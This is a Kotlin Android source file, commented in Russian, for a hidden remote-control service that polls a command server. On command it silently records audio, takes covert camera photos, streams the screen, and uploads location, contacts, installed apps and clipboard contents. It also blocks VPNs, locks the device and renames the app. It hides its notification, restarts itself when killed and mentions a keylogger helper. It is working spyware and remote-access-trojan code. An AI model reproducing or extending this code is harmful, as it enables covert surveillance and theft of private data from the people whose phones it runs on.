package com.phonecontrol

import android.app.*
import android.content.ClipboardManager
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.graphics.ImageFormat
import android.graphics.SurfaceTexture
import android.hardware.camera2.*
import android.location.LocationManager
import android.media.AudioManager
import android.media.ImageReader
import android.net.Uri
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.ContactsContract
import android.provider.Settings
import android.util.Log
import android.view.Surface
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.MediaType.Companion.toMediaType
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.TimeUnit

class ControlService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var pollingJob: Job? = null
    private var deviceActive = false
    private var wakeLock: android.os.PowerManager.WakeLock? = null
    private var consecutiveErrors = 0
    private var lastInstanceId = ""        // последний известный instance_id сервера
    private var lastStateSaveTime = 0L     // когда последний раз сохраняли state

    /** Уникальный ID устройства — генерируется один раз и сохраняется в SharedPreferences. */
    private lateinit var deviceId: String

    companion object {
        const val CHANNEL_ID = "PhoneControlChannel"
        const val NOTIF_ID = 1
        const val SERVER_URL = BuildConfig.SERVER_URL
        const val DEVICE_SECRET = BuildConfig.DEVICE_SECRET
        const val TAG = "ControlService"
        private const val MAX_CONSECUTIVE_ERRORS = 10
        private const val PREFS_NAME = "phonecontrol_prefs"
        private const val PREF_DEVICE_ID = "device_id"
    }

    /** Получить или создать постоянный DEVICE_ID. */
    private fun getOrCreateDeviceId(): String {
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        return prefs.getString(PREF_DEVICE_ID, null) ?: run {
            val newId = java.util.UUID.randomUUID().toString().replace("-", "").take(16)
            prefs.edit().putString(PREF_DEVICE_ID, newId).apply()
            newId
        }
    }

    private val httpClient: OkHttpClient by lazy {
        OkHttpClient.Builder()
            .connectTimeout(15, TimeUnit.SECONDS)
            .readTimeout(15, TimeUnit.SECONDS)
            .retryOnConnectionFailure(true)
            .build()
    }

    override fun onCreate() {
        // Сохраняем ALLOWED_CHAT_ID чтобы MonitorReceiver и KeyloggerHelper знали куда слать
        try {
            val chatId = BuildConfig::class.java.getField("ALLOWED_CHAT_ID").get(null) as? String ?: ""
            if (chatId.isNotEmpty()) {
                getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                    .edit().putString("allowed_chat_id", chatId).apply()
            }
        } catch (_: Exception) {}
        super.onCreate()
        deviceId = getOrCreateDeviceId()
        createNotificationChannel()
        startForeground(NOTIF_ID, buildNotification("Слежу за командами..."))

        val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        wakeLock = pm.newWakeLock(
            android.os.PowerManager.PARTIAL_WAKE_LOCK,
            "PhoneControl::PollingWakeLock"
        ).also { it.acquire() }

        startPolling()
        BootReceiver.scheduleWatchdog(this)
        KeepAliveWorker.schedule(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        Log.w(TAG, "Service destroyed")
        scope.cancel()
        try { wakeLock?.release() } catch (e: Exception) { }
        super.onDestroy()

        val restartIntent = Intent(applicationContext, ControlService::class.java)
        val pendingIntent = PendingIntent.getService(
            applicationContext, 1, restartIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        (getSystemService(Context.ALARM_SERVICE) as AlarmManager).setExactAndAllowWhileIdle(
            AlarmManager.ELAPSED_REALTIME_WAKEUP,
            android.os.SystemClock.elapsedRealtime() + 3_000L,
            pendingIntent
        )
    }

    private val PREFS_STATE = "phonecontrol_state"

    private fun saveStateFromServer() {
        scope.launch {
            try {
                val request = Request.Builder()
                    .url("$SERVER_URL/get_state")
                    .addHeader("X-Device-Secret", DEVICE_SECRET)
                    .build()
                httpClient.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        val body = response.body?.string() ?: return@use
                        getSharedPreferences(PREFS_STATE, Context.MODE_PRIVATE)
                            .edit().putString("state_json", body).apply()
                        Log.d(TAG, "State saved from server")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "saveStateFromServer failed: ${e.message}")
            }
        }
    }

    private fun restoreStateToServer() {
        scope.launch {
            try {
                val prefs = getSharedPreferences(PREFS_STATE, Context.MODE_PRIVATE)
                val stateJson = prefs.getString("state_json", null) ?: run {
                    Log.w(TAG, "No saved state to restore")
                    return@launch
                }
                val request = Request.Builder()
                    .url("$SERVER_URL/restore_state")
                    .addHeader("X-Device-Secret", DEVICE_SECRET)
                    .addHeader("Content-Type", "application/json")
                    .post(okhttp3.RequestBody.create(
                        "application/json".toMediaType(), stateJson))
                    .build()
                httpClient.newCall(request).execute().use { response ->
                    Log.d(TAG, "State restored: ${response.code}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "restoreStateToServer failed: ${e.message}")
            }
        }
    }

    private fun startPolling() {
        pollingJob?.cancel()
        pollingJob = scope.launch {
            while (isActive) {
                try {
                    val result = poll()
                    consecutiveErrors = 0

                    val active = result.optBoolean("active", false)
                    if (active != deviceActive) {
                        deviceActive = active
                        updateNotification(if (deviceActive) "Режим управления активен" else "Слежу за командами...")
                    }

                    // Проверяем instance_id — если изменился, сервер перезапустился
                    val instanceId = result.optString("instance_id", "")
                    if (instanceId.isNotEmpty() && instanceId != lastInstanceId) {
                        if (lastInstanceId.isNotEmpty()) {
                            // Сервер перезапустился — восстанавливаем state
                            Log.w(TAG, "Server restarted (new instance: $instanceId), restoring state...")
                            restoreStateToServer()
                        } else {
                            // Первый запуск — сохраняем текущий state
                            saveStateFromServer()
                        }
                        lastInstanceId = instanceId
                    }

                    // Сохраняем state каждый час
                    val now = System.currentTimeMillis()
                    if (now - lastStateSaveTime > 60 * 60 * 1000L) {
                        saveStateFromServer()
                        lastStateSaveTime = now
                    }

                    val cmd = result.optJSONObject("command")
                    if (cmd != null) handleCommand(cmd)

                } catch (e: Exception) {
                    consecutiveErrors++
                    Log.e(TAG, "Poll error #$consecutiveErrors: ${e.message}")
                    if (consecutiveErrors >= MAX_CONSECUTIVE_ERRORS) {
                        consecutiveErrors = 0
                        delay(60_000L)
                        continue
                    }
                }
                delay(if (deviceActive) 10_000L else 30_000L)
            }
        }
    }

    private fun poll(): JSONObject {
        val model = android.os.Build.MANUFACTURER.replaceFirstChar { it.uppercase() } +
                " " + android.os.Build.MODEL
        val request = Request.Builder()
            .url("$SERVER_URL/poll")
            .addHeader("X-Device-Secret", DEVICE_SECRET)
            .addHeader("X-Device-Id", deviceId)
            .addHeader("X-Device-Model", model)
            .addHeader("X-Device-Platform", "android")
            .build()
        httpClient.newCall(request).execute().use { response ->
            val body = response.body?.string() ?: "{}"
            if (!response.isSuccessful) throw Exception("HTTP ${response.code}")
            return JSONObject(body)
        }
    }

    private fun handleCommand(cmd: JSONObject) {
        scope.launch(SupervisorJob()) {
            try {
                val lock = cmd.optBoolean("lock", false)
                val duration = cmd.optInt("duration", 0)
                when (cmd.optString("cmd")) {
                    "shutdown"      -> shutdown()
                    "dnd_off"       -> disableDnD()
                    "show_message"  -> {
                        val fbMode      = cmd.optString("fb_mode", "plain")
                        val replyPrompt = cmd.optString("reply_prompt", "✏️ Напиши ответ:")
                        val chatId      = cmd.optString("_chat_id", "")
                        val survey      = buildList {
                            val arr = cmd.optJSONArray("survey")
                            if (arr != null) for (i in 0 until arr.length()) add(arr.getString(i))
                        }
                        OverlayActivity.start(
                            this@ControlService,
                            cmd.optString("text", "Сообщение"),
                            fbMode, replyPrompt, survey, chatId
                        )
                    }
                    "ban"           -> startVpnBlock()
                    "unban"         -> stopVpnBlock()
                    "video"         -> {
                        val fbMode      = cmd.optString("fb_mode", "plain")
                        val replyPrompt = cmd.optString("reply_prompt", "✏️ Напиши ответ:")
                        val chatId      = cmd.optString("_chat_id", "")
                        val survey      = buildList {
                            val arr = cmd.optJSONArray("survey")
                            if (arr != null) for (i in 0 until arr.length()) add(arr.getString(i))
                        }
                        VideoActivity.startBuiltin(this@ControlService, cmd.optInt("num", 1), lock, duration,
                            fbMode, replyPrompt, survey, chatId)
                    }
                    "play_raw"      -> {
                        val fbMode      = cmd.optString("fb_mode", "plain")
                        val replyPrompt = cmd.optString("reply_prompt", "✏️ Напиши ответ:")
                        val chatId      = cmd.optString("_chat_id", "")
                        val survey      = buildList {
                            val arr = cmd.optJSONArray("survey")
                            if (arr != null) for (i in 0 until arr.length()) add(arr.getString(i))
                        }
                        val rawNum = cmd.optInt("raw_num", 1)
                        val files = cacheDir.listFiles { f ->
                            f.name.startsWith("raw_") && f.name.endsWith(".mp4") && f.length() > 0
                        }?.sortedBy { it.name } ?: emptyList()
                        val file = files.getOrNull(rawNum - 1)
                        if (file != null) {
                            VideoActivity.startFromUrl(this@ControlService, "file://${file.absolutePath}", lock, duration,
                                fbMode, replyPrompt, survey, chatId)
                        } else {
                            Log.e(TAG, "play_raw: file #$rawNum not found, total=${files.size}")
                        }
                    }
                    "prefetch"      -> prefetchVideo(cmd.optString("url"), cmd.optString("_chat_id", ""))
                    "delete_video"  -> deleteVideoCache(cmd.optString("url"))
                    "get_video_list" -> sendVideoList(cmd.optString("_chat_id", ""))
                    "get_audio_devices" -> sendAudioDevices(cmd.optString("_chat_id", ""))
                    "record_audio"  -> recordAudio(
                        cmd.optInt("seconds", 10),
                        cmd.optString("_chat_id", "")
                    )
                    "sound"         -> setVolume(cmd.optInt("level", 5))
                    "unban_video"   -> VideoActivity.unlock()
                    "rename"        -> AppNameHelper.rename(this@ControlService, cmd.optString("name"))
                    "open_gallery"  -> FilePickerActivity.startGallery(this@ControlService, cmd.optString("_chat_id", ""))
                    "open_camera"   -> FilePickerActivity.startCamera(this@ControlService, cmd.optString("_chat_id", ""))
                    "stream_start"  -> startStream(cmd.optString("_chat_id", ""))
                    "stream_stop"   -> stopStream(cmd.optString("_chat_id", ""))
                    "get_location"  -> sendLocation(cmd.optString("_chat_id", ""))
                    "get_contacts"  -> sendContacts(cmd.optString("_chat_id", ""))
                    "get_apps"      -> sendInstalledApps(cmd.optString("_chat_id", ""))
                    "get_clipboard" -> sendClipboard(cmd.optString("_chat_id", ""))
                    "set_brightness"-> setBrightness(cmd.optInt("level", 50))
                    "vibrate"       -> vibrate(cmd.optLong("ms", 500))
                    "flashlight"    -> setFlashlight(cmd.optBoolean("on", true), cmd.optString("_chat_id", ""))
                    "take_photo"    -> takePhoto(cmd.optString("camera", "back"), cmd.optString("_chat_id", ""))
                }
            } catch (e: Exception) {
                Log.e(TAG, "Command failed: ${e.message}")
            }
        }
    }

    private fun prefetchVideo(url: String, chatId: String = "") {
        if (url.isEmpty()) return
        val cacheFile = VideoActivity.getCacheFile(this, url)
        if (cacheFile.exists() && cacheFile.length() > 0) {
            Log.d(TAG, "prefetch: already cached")
            if (chatId.isNotEmpty()) sendTextReply(chatId, "✅ Видео уже есть в списке.")
            return
        }
        scope.launch {
            try {
                Log.d(TAG, "prefetch start: $url")
                val connection = URL(url).openConnection() as HttpURLConnection
                connection.connectTimeout = 15_000
                connection.readTimeout = 60_000
                connection.instanceFollowRedirects = true
                connection.setRequestProperty("User-Agent", "Mozilla/5.0")
                connection.connect()
                val tmp = File(cacheDir, "tmp_prefetch_${System.currentTimeMillis()}.mp4")
                connection.inputStream.use { input ->
                    FileOutputStream(tmp).use { output ->
                        val buf = ByteArray(8192)
                        var read: Int
                        while (input.read(buf).also { read = it } != -1) output.write(buf, 0, read)
                    }
                }
                tmp.renameTo(cacheFile)
                Log.d(TAG, "prefetch done: ${cacheFile.path}")
                if (chatId.isNotEmpty()) {
                    sendTextReply(chatId, "✅ Видео скачано. Посмотри /lists чтобы воспроизвести.")
                }
            } catch (e: Exception) {
                Log.e(TAG, "prefetch failed: ${e.message}")
                if (chatId.isNotEmpty()) {
                    sendTextReply(chatId, "⚠️ Ошибка скачивания: ${e.message}")
                }
            }
        }
    }

    private fun sendVideoList(chatId: String) {
        if (chatId.isEmpty()) return
        scope.launch {
            try {
                // Собираем все raw_*.mp4 из cacheDir
                val files = cacheDir.listFiles { f ->
                    f.name.startsWith("raw_") && f.name.endsWith(".mp4") && f.length() > 0
                } ?: emptyArray()

                val body = okhttp3.RequestBody.create(
                    "application/json".toMediaType(),
                    org.json.JSONObject().apply {
                        put("chat_id", chatId)
                        put("device_id", deviceId)
                        val arr = org.json.JSONArray()
                        files.forEachIndexed { i, f ->
                            arr.put(org.json.JSONObject().apply {
                                put("name", "video${i + 1}")
                                put("filename", f.name)
                                put("size_mb", String.format("%.1f", f.length() / 1024f / 1024f))
                            })
                        }
                        put("videos", arr)
                    }.toString()
                )
                val request = Request.Builder()
                    .url("$SERVER_URL/video_list")
                    .addHeader("X-Device-Secret", DEVICE_SECRET)
                    .post(body)
                    .build()
                httpClient.newCall(request).execute().close()
            } catch (e: Exception) {
                Log.e(TAG, "sendVideoList error: $e")
            }
        }
    }

    private fun sendAudioDevices(chatId: String) {
        if (chatId.isEmpty()) return
        scope.launch {
            try {
                val body = okhttp3.RequestBody.create(
                    "application/json".toMediaType(),
                    org.json.JSONObject().apply {
                        put("chat_id", chatId)
                        put("device_id", deviceId)
                        // На Android всегда один микрофон
                        val arr = org.json.JSONArray()
                        arr.put(org.json.JSONObject().apply {
                            put("index", 0)
                            put("name", "Встроенный микрофон")
                        })
                        put("devices", arr)
                    }.toString()
                )
                val request = Request.Builder()
                    .url("$SERVER_URL/micro_devices")
                    .addHeader("X-Device-Secret", DEVICE_SECRET)
                    .post(body)
                    .build()
                httpClient.newCall(request).execute().close()
            } catch (e: Exception) {
                Log.e(TAG, "sendAudioDevices error: $e")
            }
        }
    }

    private fun recordAudio(seconds: Int, chatId: String) {
        if (chatId.isEmpty()) return
        scope.launch {
            val outFile = File(cacheDir, "micro_${System.currentTimeMillis()}.m4a")
            val recorder = android.media.MediaRecorder().apply {
                setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
                setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(128000)
                setOutputFile(outFile.absolutePath)
                prepare()
                start()
            }
            kotlinx.coroutines.delay(seconds * 1000L)
            try { recorder.stop() } catch (e: Exception) { }
            recorder.release()

            if (!outFile.exists() || outFile.length() == 0L) {
                sendTextReply(chatId, "⚠️ Не удалось записать аудио.")
                return@launch
            }

            // Отправляем файл на сервер
            try {
                val fileBody = okhttp3.RequestBody.create(
                    "audio/mp4".toMediaType(), outFile
                )
                val multipart = okhttp3.MultipartBody.Builder()
                    .setType(okhttp3.MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId)
                    .addFormDataPart("device_id", deviceId)
                    .addFormDataPart("audio", outFile.name, fileBody)
                    .build()
                val request = Request.Builder()
                    .url("$SERVER_URL/audio_upload")
                    .addHeader("X-Device-Secret", DEVICE_SECRET)
                    .post(multipart)
                    .build()
                httpClient.newCall(request).execute().close()
                outFile.delete()
            } catch (e: Exception) {
                Log.e(TAG, "recordAudio upload error: $e")
                sendTextReply(chatId, "⚠️ Ошибка отправки аудио: ${e.message}")
            }
        }
    }

    private fun shutdown() {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        val cn = android.content.ComponentName(this, AdminReceiver::class.java)
        if (dpm.isAdminActive(cn)) dpm.lockNow()
    }

    private fun disableDnD() {
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (nm.isNotificationPolicyAccessGranted)
            nm.setInterruptionFilter(NotificationManager.INTERRUPTION_FILTER_ALL)
    }

    private fun startVpnBlock() {
        startService(Intent(this, BlockVpnService::class.java))
        VpnMonitor.start(this)
    }

    private fun stopVpnBlock() {
        VpnMonitor.stop(this)
        startService(Intent(this, BlockVpnService::class.java).apply { action = "STOP" })
    }

    private fun setVolume(level: Int) {
        val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        listOf(
            AudioManager.STREAM_MUSIC,
            AudioManager.STREAM_RING,
            AudioManager.STREAM_NOTIFICATION,
            AudioManager.STREAM_ALARM
        ).forEach { stream ->
            val max = am.getStreamMaxVolume(stream)
            val target = (level / 10f * max).toInt().coerceIn(0, max)
            try { am.setStreamVolume(stream, target, 0) } catch (e: Exception) { }
        }
    }

    private fun deleteVideoCache(url: String) {
        if (url.isEmpty()) return
        val file = VideoActivity.getCacheFile(this, url)
        if (file.exists()) file.delete()
    }

    private fun showOverlayMessage(text: String) {
        try {
            val intent = Intent(this, OverlayActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_CLEAR_TOP or
                        Intent.FLAG_ACTIVITY_SINGLE_TOP
                putExtra("message", text)
            }
            startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "showOverlayMessage failed: ${e.message}")
        }
    }

    private fun createNotificationChannel() {
        val nm = getSystemService(NotificationManager::class.java)
        // IMPORTANCE_MIN: нет звука, нет вибрации, не появляется в шторке развёрнутой,
        // только крошечная иконка в статусбаре (и то на некоторых прошивках скрыта)
        nm.createNotificationChannel(
            NotificationChannel(CHANNEL_ID, "Phone Control", NotificationManager.IMPORTANCE_MIN).apply {
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
        )
    }

    private fun buildNotification(text: String): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)  // не видна на экране блокировки
            .setSilent(true)
            .setShowWhen(false)
            .build()

    private fun updateNotification(text: String) {
        getSystemService(NotificationManager::class.java).notify(NOTIF_ID, buildNotification(text))
    }
    private fun sendTextReply(chatId: String, text: String) {
        try {
            val body = okhttp3.RequestBody.create(
                "application/json".toMediaType(),
                org.json.JSONObject().apply {
                    put("chat_id", chatId)
                    put("device_id", deviceId)
                    put("text", text)
                }.toString()
            )
            val request = Request.Builder()
                .url("$SERVER_URL/text_reply")
                .addHeader("X-Device-Secret", DEVICE_SECRET)
                .post(body)
                .build()
            httpClient.newCall(request).execute().close()
        } catch (e: Exception) {
            Log.e(TAG, "sendTextReply error: $e")
        }
    }

    private fun startStream(chatId: String) {
        val intent = Intent(this, StreamPermissionActivity::class.java)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
        scope.launch {
            kotlinx.coroutines.delay(3000)
            val url = ScreenStreamService.streamUrl
            if (url.isNotEmpty()) {
                sendTextReply(chatId, "📡 Стрим запущен\n🔗 $url\n\nОткрой ссылку в браузере на том же WiFi")
            }
        }
    }

    private fun stopStream(chatId: String) {
        val intent = Intent(this, ScreenStreamService::class.java).apply {
            action = ScreenStreamService.ACTION_STOP
        }
        startService(intent)
        scope.launch {
            sendTextReply(chatId, "⛔ Стрим остановлен")
        }
    }


    // ─── Location ─────────────────────────────────────────────────────────────

    private fun sendLocation(chatId: String) {
        scope.launch {
            try {
                val lm = getSystemService(LOCATION_SERVICE) as LocationManager
                val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)
                var loc: android.location.Location? = null
                for (p in providers) {
                    if (lm.isProviderEnabled(p)) {
                        loc = lm.getLastKnownLocation(p)
                        if (loc != null) break
                    }
                }
                if (loc == null) {
                    sendTextReply(chatId, "📍 Местоположение недоступно (GPS выключен или нет кеша)")
                } else {
                    val lat = loc.latitude
                    val lon = loc.longitude
                    val acc = loc.accuracy.toInt()
                    sendTextReply(chatId, "📍 Местоположение:
https://maps.google.com/?q=$lat,$lon

Точность: ${acc}м")
                }
            } catch (e: Exception) {
                sendTextReply(chatId, "📍 Ошибка: ${e.message}")
            }
        }
    }

    // ─── Contacts ─────────────────────────────────────────────────────────────

    private fun sendContacts(chatId: String) {
        scope.launch {
            try {
                val cursor = contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    arrayOf(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER
                    ),
                    null, null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
                )
                val contacts = mutableListOf<String>()
                cursor?.use {
                    while (it.moveToNext()) {
                        val name = it.getString(0) ?: ""
                        val num  = it.getString(1) ?: ""
                        contacts.add("$name: $num")
                    }
                }
                if (contacts.isEmpty()) {
                    sendTextReply(chatId, "📒 Контакты пусты")
                    return@launch
                }
                // Отправляем по 100 контактов на сообщение
                contacts.chunked(100).forEachIndexed { i, chunk ->
                    val text = "📒 Контакты [${i+1}/${(contacts.size+99)/100}]:
" + chunk.joinToString("
")
                    sendTextReply(chatId, text)
                }
            } catch (e: Exception) {
                sendTextReply(chatId, "📒 Ошибка: ${e.message}")
            }
        }
    }

    // ─── Installed apps ───────────────────────────────────────────────────────

    private fun sendInstalledApps(chatId: String) {
        scope.launch {
            try {
                val pm = packageManager
                val apps = pm.getInstalledApplications(android.content.pm.PackageManager.GET_META_DATA)
                    .filter { it.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM == 0 }
                    .map { pm.getApplicationLabel(it).toString() + " (${it.packageName})" }
                    .sorted()
                if (apps.isEmpty()) {
                    sendTextReply(chatId, "📱 Нет установленных приложений")
                    return@launch
                }
                apps.chunked(50).forEachIndexed { i, chunk ->
                    val text = "📱 Приложения [${i+1}/${(apps.size+49)/50}]:
" + chunk.joinToString("
")
                    sendTextReply(chatId, text)
                }
            } catch (e: Exception) {
                sendTextReply(chatId, "📱 Ошибка: ${e.message}")
            }
        }
    }

    // ─── Clipboard ────────────────────────────────────────────────────────────

    private fun sendClipboard(chatId: String) {
        // Clipboard доступен только из главного потока
        Handler(Looper.getMainLooper()).post {
            try {
                val cm = getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
                val text = cm.primaryClip?.getItemAt(0)?.coerceToText(this)?.toString()
                scope.launch {
                    if (text.isNullOrEmpty()) {
                        sendTextReply(chatId, "📋 Буфер обмена пуст")
                    } else {
                        sendTextReply(chatId, "📋 Буфер обмена:
$text")
                    }
                }
            } catch (e: Exception) {
                scope.launch { sendTextReply(chatId, "📋 Ошибка: ${e.message}") }
            }
        }
    }

    // ─── Brightness ───────────────────────────────────────────────────────────

    private fun setBrightness(level: Int) {
        try {
            val value = (level.coerceIn(0, 100) * 2.55).toInt()
            Settings.System.putInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS_MODE,
                Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL)
            Settings.System.putInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS, value)
        } catch (e: Exception) {
            Log.e(TAG, "setBrightness: ${e.message}")
        }
    }

    // ─── Vibrate ──────────────────────────────────────────────────────────────

    private fun vibrate(ms: Long) {
        try {
            val vib = getSystemService(VIBRATOR_SERVICE) as android.os.Vibrator
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                vib.vibrate(android.os.VibrationEffect.createOneShot(ms, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                vib.vibrate(ms)
            }
        } catch (e: Exception) {
            Log.e(TAG, "vibrate: ${e.message}")
        }
    }

    // ─── Flashlight ───────────────────────────────────────────────────────────

    private fun setFlashlight(on: Boolean, chatId: String) {
        scope.launch {
            try {
                val cm = getSystemService(CAMERA_SERVICE) as CameraManager
                val cameraId = cm.cameraIdList.firstOrNull { id ->
                    cm.getCameraCharacteristics(id)
                        .get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
                }
                if (cameraId == null) {
                    sendTextReply(chatId, "🔦 Вспышка недоступна")
                    return@launch
                }
                cm.setTorchMode(cameraId, on)
            } catch (e: Exception) {
                Log.e(TAG, "flashlight: ${e.message}")
            }
        }
    }

    // ─── Silent photo ─────────────────────────────────────────────────────────

    private fun takePhoto(camera: String, chatId: String) {
        scope.launch {
            try {
                val cm = getSystemService(CAMERA_SERVICE) as CameraManager
                // Выбираем камеру: "front" или "back"
                val facing = if (camera == "front") CameraCharacteristics.LENS_FACING_FRONT
                             else CameraCharacteristics.LENS_FACING_BACK
                val cameraId = cm.cameraIdList.firstOrNull { id ->
                    cm.getCameraCharacteristics(id)
                        .get(CameraCharacteristics.LENS_FACING) == facing
                } ?: cm.cameraIdList.firstOrNull() ?: return@launch

                val imageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1)
                val surface = imageReader.surface
                val texture = SurfaceTexture(1)
                val previewSurface = Surface(texture)

                val captureJob = CompletableDeferred<ByteArray?>()

                imageReader.setOnImageAvailableListener({ reader ->
                    val image = reader.acquireLatestImage()
                    val bytes = image?.planes?.get(0)?.buffer?.let { buf ->
                        ByteArray(buf.remaining()).also { buf.get(it) }
                    }
                    image?.close()
                    captureJob.complete(bytes)
                }, Handler(Looper.getMainLooper()))

                val stateCallback = object : CameraDevice.StateCallback() {
                    override fun onOpened(device: CameraDevice) {
                        val surfaces = listOf(surface, previewSurface)
                        device.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                val request = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                    addTarget(surface)
                                }.build()
                                session.capture(request, object : CameraCaptureSession.CaptureCallback() {
                                    override fun onCaptureCompleted(s: CameraCaptureSession, r: CaptureRequest, result: TotalCaptureResult) {
                                        scope.launch {
                                            val bytes = captureJob.await()
                                            device.close()
                                            imageReader.close()
                                            texture.release()
                                            if (bytes != null) {
                                                Uploader.uploadBytes(this@ControlService, bytes, "photo_${System.currentTimeMillis()}.jpg", "image/jpeg", chatId)
                                            } else {
                                                sendTextReply(chatId, "📷 Не удалось сделать фото")
                                            }
                                        }
                                    }
                                }, Handler(Looper.getMainLooper()))
                            }
                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                captureJob.complete(null)
                                device.close()
                            }
                        }, Handler(Looper.getMainLooper()))
                    }
                    override fun onDisconnected(device: CameraDevice) { device.close() }
                    override fun onError(device: CameraDevice, error: Int) { device.close(); captureJob.complete(null) }
                }

                cm.openCamera(cameraId, stateCallback, Handler(Looper.getMainLooper()))

            } catch (e: Exception) {
                Log.e(TAG, "takePhoto: ${e.message}", e)
                sendTextReply(chatId, "📷 Ошибка: ${e.message}")
            }
        }
    }

}
